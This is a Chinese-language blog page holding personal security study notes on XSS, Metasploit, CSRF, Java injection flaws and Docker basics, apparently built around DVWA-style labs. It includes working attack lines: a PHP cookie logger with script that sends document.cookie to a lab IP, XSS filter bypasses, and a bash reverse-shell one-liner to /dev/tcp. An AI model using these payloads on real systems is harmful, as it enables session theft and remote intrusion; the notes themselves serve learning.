<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">XSS危害</span><br><span class="line">    盗取用户cookie</span><br><span class="line">    修改网页内容</span><br><span class="line">    网站挂木马</span><br><span class="line">    利用网站重定向</span><br><span class="line">    XSS蠕虫</span><br><span class="line">XSS恶意代码大都使用javascript，要深入研究，需要精通Javascript</span><br><span class="line">用户用浏览器如果版本太新自带防XSS</span><br><span class="line"></span><br><span class="line"><span class="comment">//XSS又叫CSS(Cross Site Script)跨站脚本攻击，指往web页面插入恶意的HTML代码。用户浏览web时，html代码会被运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//向可输入框插入恶意的HTML代码或javascript代码</span></span><br><span class="line">    </span><br><span class="line">攻击语句</span><br><span class="line"><span class="comment">#页面跳转</span></span><br><span class="line">&lt;script&gt;location=<span class="string">&quot;http://www.baidu.com&quot;</span>&lt;/script&gt;</span><br><span class="line"><span class="comment">#嵌入网页</span></span><br><span class="line">&lt;iframe src=http:<span class="comment">//www.baidu.com width=400 height=300&gt;&lt;/iframe&gt;</span></span><br><span class="line">&lt;iframe src=http:<span class="comment">//www.baidu.com width=0 height=0 frameborder=0&gt;&lt;/iframe&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="非持久性–反射型XSS"><a href="#非持久性–反射型XSS" class="headerlink" title="非持久性–反射型XSS"></a>非持久性–反射型XSS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这种攻击方式无法将恶意代码保存到网站中，而支队当前url生效，因而它需要用户自行去触发，通常出现在网站搜索栏，用户登入口等地方</span><br><span class="line"><span class="comment">//通过GET和POST向服务器输入数据，输入数据一般放在URL或者form数据中，如果服务器对输入数据不过滤，验证和编码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&lt;script&gt;alert(&quot;hyy&quot;)&lt;/script&gt;</span></span><br><span class="line"><span class="comment">//&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="持久性–存储型XSS"><a href="#持久性–存储型XSS" class="headerlink" title="持久性–存储型XSS"></a>持久性–存储型XSS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接将xss语句插入到网站的正常页面中（通常留言本），用户访问了这些页面，就会自动执行其中的xss语句，靶机：NPMserv中的火线BLOG网页</span><br><span class="line"><span class="comment">//服务器将用户输入的恶意脚本没有通过验证直接存放在数据库，且每次通过调用数据库的方式将数据呈现在浏览器上，该XSS脚本攻击将一直存在。若用户访问该页面，恶意脚本就会触发，用于盗取其他用户的私人信息</span></span><br></pre></td></tr></table></figure>

<h2 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//trim(?)函数用于去除字符串左右两侧的空格</span></span><br><span class="line"><span class="comment">//mysql_real_escape_string(?)转义，xss语句可能存在单引号等字符，但这些字符只是在被存入数据库时被进行了转义，当他们从数据库调出来在浏览器执行时，并不影响其原本功能</span></span><br><span class="line"><span class="comment">//htmlspecialshars(?)把预定义的字符转换为html实体，例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$str</span> = <span class="string">&quot;this is some &lt;b&gt;bold&lt;/b&gt; text&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//stripslashes(?)删除反斜杠</span></span><br><span class="line"><span class="comment">//addslashes()函数返回预定义字符之前添加反斜杠的字符串，预定义字符为单双引号，反斜杠\，NULL</span></span><br><span class="line"><span class="comment">//strip_tags()过滤字符串中的html标签</span></span><br></pre></td></tr></table></figure>

<h2 id="接受cookie的页面代码"><a href="#接受cookie的页面代码" class="headerlink" title="接受cookie的页面代码"></a>接受cookie的页面代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">准备一台安装又PHP环境的Web服务器(e.g.  <span class="number">192.168</span>.<span class="number">88.1</span>)创建一个名为getcookie.php的网页代码如下</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);			<span class="comment">//远程主机地址</span></span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);			<span class="comment">//格式显示时间</span></span><br><span class="line">    <span class="variable">$referer</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_REFERER&#x27;</span>);		<span class="comment">//链接来源</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;cookie.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);			<span class="comment">//打开cookie.txt,若不存在就创建它</span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;	IP:&quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot;	Date and Time: &quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;	Referer:&quot;</span>.<span class="variable">$referer</span>.<span class="string">&quot;	Cookie:&quot;</span>.<span class="variable">$cookie</span>.<span class="string">&quot;|||&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">如何测试：给这个网页发get请求</span><br><span class="line">    </span><br><span class="line">窃取cookie，write里面时三部分拼接在一起</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.<span class="title function_ invoke__">write</span>(</span><br><span class="line">    	<span class="string">&#x27;&lt;img src=&quot;http://192.168.88.1/getcookie.php?cookie=&#x27;</span> + </span><br><span class="line">    	document.cookie + </span><br><span class="line">    	<span class="string">&#x27;&quot; width=0 height=0 border=0 /&gt;&#x27;</span></span><br><span class="line">	);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">firebug扩展可以改cookie不过已经停止维护了</span><br></pre></td></tr></table></figure>

<h2 id="突破过滤"><a href="#突破过滤" class="headerlink" title="突破过滤"></a>突破过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;script&gt;过滤</span><br><span class="line">用&lt;img&gt;或者双写script</span><br><span class="line">2.alert过滤</span><br><span class="line">用	&lt;script&gt;confirm(&#x27;hi&#x27;)&lt;/script&gt;</span><br><span class="line">	&lt;img src=1 onerror=confirm(&#x27;1&#x27;)&gt;</span><br><span class="line">3.XSS语句输出标签属性中突破</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.对前端输入和输出过滤编码</span></span><br><span class="line">htmlspecialchars、strip_tags</span><br><span class="line"><span class="comment">//2.关键cookie只用host-only</span></span><br></pre></td></tr></table></figure>

<h1 id="Metasploit-系统漏洞"><a href="#Metasploit-系统漏洞" class="headerlink" title="Metasploit(系统漏洞)"></a>Metasploit(系统漏洞)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Metasploit Framework(MSF)集成了各个平台上常见的溢出漏洞和利用代码</span><br><span class="line">sectools排第二</span><br></pre></td></tr></table></figure>

<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果能够成功地对目标计算机进行缓冲区溢出，那么就可以直接获得系统shell</span><br><span class="line">要成功进行缓冲区溢出，前提是目标计算机存在漏洞</span><br><span class="line">微软对Windows系统的漏洞MS08_067		MS表示Windows2008年第67个漏洞</span><br></pre></td></tr></table></figure>

<h2 id="kali上使用"><a href="#kali上使用" class="headerlink" title="kali上使用"></a>kali上使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">具体看https://www.bilibili.com/video/BV1Di4y1u7s6?p=16&amp;vd_source=d5448e640adeda715972607248810967</span><br><span class="line">没看完</span><br><span class="line"></span><br><span class="line">自带,PostgreSQL是一种特性非常齐全的自由软件的对象-关系型数据库管理系统（ORDBMS）</span><br><span class="line">service postgresql start		首先打开数据库</span><br><span class="line">msfconsole						打开msf，windows也是这句</span><br><span class="line">包含模块：	一般先使用渗透攻击模块exploit对目标进行渗透，渗透成功后执行攻击荷载模块</span><br><span class="line">exploit		渗透攻击模块，用于实际发起攻击</span><br><span class="line">auxiliary	辅助模块，执行扫描之类的动作</span><br><span class="line">payload		攻击荷载模块，目标被成功渗透后执行的代码，payload中主要内容包括shellcode，一段获取shell的代码</span><br><span class="line"></span><br><span class="line">MS14_064漏洞</span><br><span class="line">远程攻击者可利用此漏洞通过构造的网站执行任意代码</span><br><span class="line">影响Win95+IE3~Win10+IE11全版本</span><br><span class="line">Metasploit中此漏洞的利用模块是exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class="line">此exploit需要调用powershell，因而支队安装有powershell的系统有效</span><br></pre></td></tr></table></figure>

<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CSRF(Cross-Site Request Forgery)跨站点请求伪造</span><br><span class="line">特点：盗用用户的身份，以用户的名义进行某些非法操作 </span><br></pre></td></tr></table></figure>

<h2 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//medium</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]			<span class="comment">//用户提交的http协议的referer信息来源地址，</span></span><br><span class="line"><span class="comment">//bp可以改referer，有些机构禁用了referer</span></span><br><span class="line"></span><br><span class="line">同级目录下D:\phpStudy\WWW\dvwa\vulnerabilities\fi\index.php</span><br><span class="line">    </span><br><span class="line"><span class="comment">//	medium级别转义删除http:// https://	防止远程文件包含</span></span><br><span class="line"><span class="comment">//	远程包含漏洞前提，php.ini配置如下：</span></span><br><span class="line">    allow_url_fopen=on</span><br><span class="line">    allow_url_include=on</span><br><span class="line">    magic_quotes_gpc=off</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/dvwa/" data-id="cljpcwhty0002l8ezgag9b1jn" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-java安全" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/java%E5%AE%89%E5%85%A8/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.657Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ms08067"><a href="#ms08067" class="headerlink" title="ms08067"></a>ms08067</h1><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">windows版本官网安装</span><br><span class="line">setting 有个wsl要注意下</span><br><span class="line"></span><br><span class="line">docker run ubuntu echo &quot;hello world&quot;		#测试docker安装</span><br><span class="line">docker search tomcat		搜索镜像</span><br><span class="line">docker pull tomcat			下载镜像</span><br><span class="line">docker images				列出本地镜像</span><br><span class="line">docker rmi ubuntu或image ID或container ID		删除镜像</span><br><span class="line">docker run -p 8080:8080 -d dordoka/tomcat</span><br><span class="line">	-d 容器在后台运行</span><br><span class="line">	-p 容器内端口绑定到指定的主机端口</span><br><span class="line">	-P 容器内端口随机映射到主机端口</span><br><span class="line">	-t 提供终端输入</span><br><span class="line">	-i 提供交互</span><br><span class="line">	http://127.0.0.1:8080/host-manager/html</span><br><span class="line">docker ps			#查看容器</span><br><span class="line">	-a 列出所有容器</span><br><span class="line">	-q 仅列出容器id</span><br><span class="line">docker stop dordoka/tmocat或image ID或container ID</span><br><span class="line">docker exec -it fe98 /bin/bash</span><br><span class="line">	exit退出</span><br><span class="line">docker start 标识</span><br><span class="line">docker restart 标识</span><br><span class="line">docker rm 容器id			删除容器</span><br><span class="line">docker cp ./aa.txt fe98:/root/		复制文件</span><br><span class="line"></span><br><span class="line">docker-compose文件存在image镜像配置文件包括端口之类</span><br></pre></td></tr></table></figure>

<h3 id="java基础知识"><a href="#java基础知识" class="headerlink" title="java基础知识"></a>java基础知识</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">访问控制修饰符 default public protected private</span><br><span class="line">非...		final abstract static synchronized</span><br><span class="line"></span><br><span class="line">变量 			局部变量 类变量(静态变量) 成员变量(非静态变量)</span><br><span class="line">数组			存储在堆上 保存多个同类型变量</span><br><span class="line">枚举			限制变量只能在预先设定好的值</span><br><span class="line"></span><br><span class="line">继承			被继承的超类 super class 派生类为子类 subclass</span><br><span class="line">*************java ee分层模型</span><br><span class="line">	Domain Object		java对象组成 包含各自所需的业务逻辑方法</span><br><span class="line">	Data Access Object	数据库访问对象 实现数据库增删改查</span><br><span class="line">	Service				业务逻辑对象组成 系统所需要的业务逻辑方法</span><br><span class="line">	Controller			用于拦截用户请求 调用业务逻辑方法 去处理 结果发给View</span><br><span class="line">	View</span><br><span class="line">	</span><br><span class="line">*************MVC框架简述</span><br><span class="line">	Model View Controller</span><br><span class="line">	servlet API -》 Struts -》 EJB -》 Spring -》 Spring MVC</span><br><span class="line"></span><br><span class="line">1.基础语法掌握</span><br><span class="line">2.看懂代码实现的逻辑</span><br><span class="line">3.各个框架的搭建使用方法</span><br><span class="line">4.快速判断审计项目使用什么框架写的 jar包 看配置 代码引入类</span><br><span class="line"></span><br><span class="line">*************java servlet 核心技术</span><br><span class="line">	web.xml	&lt;?xml ...?&gt; &lt;web-app&gt;</span><br><span class="line">        &lt;servlet&gt;配置入口</span><br><span class="line">            &lt;description&gt;</span><br><span class="line">            &lt;display-name&gt;web应用名字</span><br><span class="line">            &lt;servlet-name&gt;声明servlet名称以便后面映射使用</span><br><span class="line">            &lt;servlet-class&gt;对应类路径</span><br><span class="line">        &lt;servlet-mapping&gt;路径入口</span><br><span class="line">            &lt;servlet-name&gt;上文配置servlet名称</span><br><span class="line">            &lt;url-pattern&gt;组件访问路径</span><br><span class="line">*************java filter 核心技术</span><br><span class="line">	servlet提供filter接口</span><br><span class="line">	对所有web资源管理 实现权限访问控制 过滤敏感词汇 压缩响应信息</span><br><span class="line">	web.xml &lt;?xml ...?&gt; &lt;web-app&gt;</span><br><span class="line">		&lt;filter&gt;</span><br><span class="line">			&lt;filter-name&gt; &lt;filter-class&gt;</span><br><span class="line">		&lt;filter-mapping&gt;</span><br><span class="line">	多个filter web.xml先申明先执行</span><br><span class="line">	</span><br><span class="line">*************java 反射机制</span><br><span class="line">	在静态语⾔中，⼀般对象的类型都是在编译期就确定下来的。⽽通过 Java 反射机制，可以动态的创建对象并调⽤其⽅法和属性</span><br><span class="line">	C/C++ 不存在反射 使运行中的程序能够获取自身的信息 可操作类或对象内部属性</span><br><span class="line">	程序运行时查找对象所属的类 任意一个类的成员变量和方法 构造一个类的对象 调用任意一个对象的方法</span><br><span class="line">	命令执行类</span><br><span class="line">		java.lang.Runtime主要方法getRuntime()返回RUntime类的对象</span><br><span class="line">			Runtime类调用exec()方法执行命令</span><br><span class="line">	获取类的对象方法</span><br><span class="line">		1.Forname() 2.直接获取 3.getClass() 4.getSysClassLoadaer().loadClass()</span><br><span class="line">不安全的反射 无视类方法、变量访问权限修饰符，调用任意类的任意方法、访问并修改成员变量值</span><br><span class="line"></span><br><span class="line">*************类加载</span><br><span class="line">java源文件(xx.java)通过javac编译成字节码文件(xx.class) 再使用类加载器加载到JVM</span><br><span class="line"></span><br><span class="line">加载Load-&gt;Link链接-&gt;Initialize初始化</span><br><span class="line">	将类的.class文件中二进制数据读入内存中，把它放进运行时数据区的方法内，然后在堆区创建java.lang.Class对象</span><br><span class="line">	将创建成的类合并至java虚拟机中，使之能执行的过程</span><br><span class="line">	JVM负责的类进行初始化</span><br><span class="line"></span><br><span class="line">*************动态代理</span><br></pre></td></tr></table></figure>

<h3 id="5-1-sql注入"><a href="#5-1-sql注入" class="headerlink" title="5.1 sql注入"></a>5.1 sql注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SQL注入的根本原因在于SQL语句的拼接构造。</span><br><span class="line">1. JDBC字符串拼接</span><br><span class="line">JDBC有两种方式执行SQL语句，分别为**PreparedStatement**和**Statement**。</span><br><span class="line">- Statement方法在每次执行时都需要编译</span><br><span class="line">- PreparedStatement会对SQL语句进行预编译，后续无需重新编译</span><br><span class="line">理论上PrepareStatement的效率和安全性会比Statement要好</span><br><span class="line"></span><br><span class="line">2. 框架使用不当造成SQL注入</span><br><span class="line">Mybatis</span><br><span class="line">	`#`的`$`的区别</span><br><span class="line">        `#`号会点语句进行预编译</span><br><span class="line">        **$&#123; &#125; 只是进行string替换，动态解析SQL的时候会进行变量替换**</span><br><span class="line"></span><br><span class="line">指定操作数据库的文件 建立session会话</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisDemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>  SqlSession session ;</span><br><span class="line">    <span class="keyword">private</span> InputStream in ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in = Resources.getResourceAsStream(<span class="string">&quot;SqlMapConfig.xml&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">SqlSessionFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>();</span><br><span class="line">        <span class="type">SqlSessionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> builder.build(in);</span><br><span class="line">         session = factory.openSession();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hibernate</span><br><span class="line">特有的语法</span><br><span class="line">hibernate.cfg.xml 操作数据库的文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">表名作为变量 需要进行拼接</span><br><span class="line">select * from `user`   </span><br><span class="line">select * from &#x27;user&#x27; #报错</span><br><span class="line">使用order需要拼接</span><br><span class="line">select * from user order by name</span><br><span class="line">select * from user order by &#x27;name&#x27; #语义不对 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考</span><br><span class="line">https://xz.aliyun.com/t/7919</span><br><span class="line">[Java安全编码之sql注入](https://www.anquanke.com/post/id/212897)</span><br><span class="line">[深入理解SQL注入与预编译（下）](https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be)</span><br></pre></td></tr></table></figure>

<h3 id="5-3-注入"><a href="#5-3-注入" class="headerlink" title="5.3 注入"></a>5.3 注入</h3><h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Runtime类调用系统命令</span><br><span class="line">	String cmd = req.getParameter(&quot;cmd&quot;);</span><br><span class="line">	Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">Runtime类底层调用ProcessBuilder类</span><br><span class="line">	ProcessBuilder pb = new ProcessBuilder(cmd);</span><br><span class="line">	Process process = pb.start();</span><br><span class="line">	</span><br><span class="line">        //不能执行</span><br><span class="line">//        String cmd = &quot;ping baidu.com &amp; dir&quot;;</span><br><span class="line">//        String[] cmd = &#123;&quot;ping&quot;, &quot;baidu.com &amp; dir&quot;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //能执行</span><br><span class="line">        String cmd = &quot;ping baidu.com&quot;;</span><br><span class="line">//        String cmd = &quot;cmd /c ping baidu.com &amp; dir&quot;;</span><br><span class="line">//        String cmd = &quot;cmd /c \&quot;ping baidu.com &amp; dir\&quot;&quot;;</span><br><span class="line">//        String[] cmd = &#123; &quot;cmd&quot;, &quot;/c&quot;,&quot;ping baidu.com &amp; dir&quot;&#125;;</span><br><span class="line">//        String[] cmd = &#123; &quot;cmd&quot;, &quot;/c&quot;,&quot;ping&quot;, &quot;baidu.com&quot;, &quot;&amp;&quot;, &quot;dir&quot;&#125;;</span><br><span class="line"></span><br><span class="line">        Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        </span><br><span class="line">	cmd /c dir 执行完dir后关闭命令窗口 </span><br><span class="line">	/k	不关闭</span><br><span class="line">	/c(clean) /k(keep)</span><br><span class="line"></span><br><span class="line">/bin/bash -c &quot;echo 111 &gt; 1.txt&quot;			#一定要加双引号</span><br><span class="line">/bin/bash -c echo 111 &gt; 1.txt			#没有写进去</span><br><span class="line">经典反弹shell</span><br><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.213.130/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">案例SpLE</span><br><span class="line">程序中存在某种功能直接执行java代码 比如反射机制</span><br><span class="line">此处obj缺start()方法 method缺&quot;calc&quot;参数 使用method.invoke(obj)调用</span><br><span class="line">Apache Commons collections 反序列化漏洞存在这个问题</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\java安全.assets\image-20230509145145937.png" alt="image-20230509145145937"></p>
<h4 id="表达式注入"><a href="#表达式注入" class="headerlink" title="表达式注入"></a>表达式注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">案例SpLE</span><br><span class="line">本质为java代码的另一种形式 Struts的OGNL表达式-&gt;远程代码执行</span><br><span class="line">jsp中表达式注入	需要递归解析</span><br><span class="line">SimpleEvaluationContext用不了</span><br><span class="line">StandardEvaluationContext有可能 高版本spring boot对输入的内容进行限制防止递归解析</span><br><span class="line"></span><br></pre></td></tr></table></figure>

